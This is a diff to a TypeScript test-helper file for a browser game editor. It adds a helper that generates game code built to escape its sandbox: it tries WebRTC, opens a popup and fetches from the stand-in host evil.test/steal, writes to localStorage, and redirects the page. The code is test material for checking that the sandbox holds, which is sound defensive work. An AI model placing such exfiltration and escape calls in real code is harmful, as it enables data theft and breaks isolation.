@@ -28,6 +28,7 @@ export interface WorldView {
   steps: Array<{ id: string; text: string; kind: string; by: string }>;
   head: string;
   origin: Record<string, unknown>;
+  gameStorage?: Record<string, string>;
 }
 
 /** The editor's test hook, loosely typed: these helpers only read and call it. */
@@ -353,6 +354,27 @@ export function jumpPatch(gameSource: string, summary = JUMP_SUMMARY): string {
 /** The open world's game.js. */
 export async function gameSource(page: Page): Promise<string> {
   return (await world(page))?.code.find((f) => f.path === 'game.js')?.source ?? '';
+}
+
+/** A game that tries every way out: the network, WebRTC, a popup and leaving its page. */
+export function escapeGame(to: string): string {
+  return `// Tries every way out of the sandbox.
+class Game extends Amble.Scene {
+  static art = { hero: { kind: 'character', rig: 'biped', role: 'hero', name: 'Pip', w: 40, h: 64 } };
+  create() {
+    this.spawnHero(200, 300, 'hero');
+    const tried = [];
+    const note = () => localStorage.setItem('tried', tried.sort().join(','));
+    try { tried.push(typeof RTCPeerConnection === 'function' && new RTCPeerConnection() ? 'rtc made' : 'rtc gone'); } catch (e) { tried.push('rtc blocked'); }
+    try { tried.push(window.open('https://evil.test/popup') ? 'popup opened' : 'popup blocked'); } catch (e) { tried.push('popup blocked'); }
+    try {
+      fetch('https://evil.test/steal').then(() => { tried.push('fetch sent'); note(); }, () => { tried.push('fetch blocked'); note(); });
+    } catch (e) { tried.push('fetch blocked'); note(); }
+    localStorage.setItem('kept', 'yes');
+    setTimeout(() => { location.href = '${to}'; }, 2500);
+  }
+}
+`;
 }
 
 // ------------------------------------------------------------------ Footsteps and requests
